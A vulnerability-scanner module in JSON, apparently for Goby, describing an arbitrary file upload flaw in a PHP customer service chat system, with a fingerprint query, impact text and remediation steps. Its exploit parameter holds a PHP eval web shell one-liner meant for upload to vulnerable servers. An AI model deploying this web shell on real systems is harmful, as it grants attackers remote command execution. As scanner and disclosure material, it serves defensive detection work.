{
  "Name": "PHP Customer Service System uploadimg.html File Upload",
  "Description": "PHP online customer service system supports web and mobile H5 webpage customer service. It only needs to embed a JS segment to quickly access the customer service system. Due to improper code filtering, it leads to unauthorized arbitrary file upload vulnerability",
  "Product": "php-chat-live",
  "Homepage": "https://gobies.org/",
  "DisclosureDate": "2021-06-06",
  "Author": "sharecast.net@gmail.com",
  "GobyQuery": "body=\"/platform/passport/resetpassword.html\"",
  "Level": "3",
  "Impact": "<p>As a result, hackers can upload malicious files to the server to obtain the server permissions.<br></p>",
  "Recommendation": "<p>1. The execution permission is disabled in the storage directory of the uploaded file.</p><p>2. File suffix white list.</p><p>3. Upgrade to the latest version.</p>",
  "References": [
    "https://mp.weixin.qq.com/s/-LnDOjoqYMjtjoVV9l-EuA"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "cmd",
      "type": "input",
      "value": "<?php @eval($_POST[1]); if($_GET['act']=='del'){unlink(__FILE__);}?>"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND"
  ],
  "ExploitSteps": null,
  "Tags": [
    "File Upload"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}